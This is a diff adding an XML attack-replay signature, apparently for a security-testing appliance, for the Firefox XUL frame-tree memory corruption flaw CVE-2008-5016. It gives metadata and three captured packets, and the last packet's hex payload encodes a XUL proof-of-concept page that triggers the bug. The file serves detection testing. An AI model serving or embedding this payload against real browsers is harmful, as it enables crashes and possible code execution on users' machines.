@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Mozilla Firefox XUL Frame Tree Memory Corruption"/>
+    <EngDesc display="true" value="There exists vulnerability in Mozilla Firefox. The vulnerability is due to insufficient validation when handling XUL frame tree. A remote attacker can exploit this vulnerability by enticing the target user to open a crafted web page. Successful exploitation would allow for arbitrary code injection and execution with the privileges of the currently logged on user. In a successful attack, arbitrary code is supplied and executed on the vulnerable target host. The behaviour of the target system is dependent on the malicious code. Note that any code executed by the attacker runs with the privileges of the logged in user. In an attack where code execution fails, the vulnerable application will terminate abnormally while parsing the malicious document."/>
+    <Intent display="true">
+      <item value="Code_Execution/Memory_Corruption"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS/IMAP/POP3/SMTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Web_Browser"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Mozilla"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Mozilla_Firefox"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Mozilla_Foundation_Firefox_2.x_prior_to_2.0.0.18&amp;3.x_prior_to_3.0.4/Mozilla_Foundation_SeaMonkey_Prior_to_1.1.13/Mozilla_Foundation_Thunderbird_Prior_to_2.0.0.18"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2008-5016"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="740a27c6e3c6049447c48b96aa5c2cac"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633996000816655364"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1263983403" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="J"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="K"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="F">
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="G">
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:0C:29:31:10:A9" destMac="00:17:A4:AA:F4:93" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01A4" Identification="3904" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="5E58" srcIP="172.16.8.204" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="1265" destPort="$HTTPdestPort" SeqNumber="8E93008D" AckNumber="A0928061" HeaderLength="05" WindowSize="FAF0" Checksum="2126" UrgentPointer="0000" Options="" Payload="474554202F7E626C696E2F706F632E78756C20485454502F312E310D0A486F73743A203137322E31362E312E31310D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F77733B20553B2057696E646F7773204E5420352E313B20656E2D55533B2072763A312E392E302E3329204765636B6F2F323030383039323431372046697265666F782F332E302E330D0A4163636570743A20746578742F68746D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C6170706C69636174696F6E2F786D6C3B713D302E392C2A2F2A3B713D302E380D0A4163636570742D4C616E67756167653A20656E2D75732C656E3B713D302E350D0A4163636570742D456E636F64696E673A20677A69702C6465666C6174650D0A4163636570742D436861727365743A2049534F2D383835392D312C7574662D383B713D302E372C2A3B713D302E370D0A4B6565702D416C6976653A203330300D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,2">
+    <Output index="F" Count="">
+      <Ethernet srcMac="00:17:A4:AA:F4:93" destMac="00:0C:29:31:10:A9" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0169" Identification="2975" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="AE22" srcIP="$destIP" destIP="172.16.8.204" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="1265" SeqNumber="A0928061" AckNumber="8E930209" HeaderLength="05" WindowSize="1920" Checksum="DB9F" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205475652C203138204E6F7620323030382030303A35343A333120474D540D0A5365727665723A204170616368652F322E302E3532202843656E744F5329205048502F342E332E390D0A4C6173742D4D6F6469666965643A205475652C203138204E6F7620323030382030303A35333A323320474D540D0A455461673A2022313264303030372D3138632D3166353634366330220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203339360D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A206170706C69636174696F6E2F766E642E6D6F7A696C6C612E78756C2B786D6C0D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="G" Count="">
+      <Ethernet srcMac="00:17:A4:AA:F4:93" destMac="00:0C:29:31:10:A9" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01B4" Identification="2977" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="ADD5" srcIP="$destIP" destIP="172.16.8.204" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="1265" SeqNumber="A09281A2" AckNumber="8E930209" HeaderLength="05" WindowSize="1920" Checksum="B2AD" UrgentPointer="0000" Options="" Payload="3C77696E646F7720786D6C6E733D22687474703A2F2F7777772E6D6F7A696C6C612E6F72672F6B65796D61737465722F676174656B65657065722F74686572652E69732E6F6E6C792E78756C223E0A3C74726565207374796C653D22636F6E74656E743A202774273B2220726F77733D222D31223E0A20203C74726565636F6C73206F6E6F766572666C6F773D226576656E742E63757272656E745461726765742E706172656E744E6F64652E72656D6F766541747472696275746528277374796C652729223E0A202020203C747265656368696C6472656E207374796C653D22646973706C61793A20626C6F636B3B22206F7264696E616C3D223222206F6E6F766572666C6F773D226576656E742E7461726765742E706172656E744E6F64652E72656D6F76654368696C64286576656E742E7461726765742922202F3E0A202020203C747265656368696C6472656E207374796C653D22646973706C61793A20626C6F636B3B222F3E0A20203C2F74726565636F6C733E0A3C2F747265653E0A3C2F77696E646F773E0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
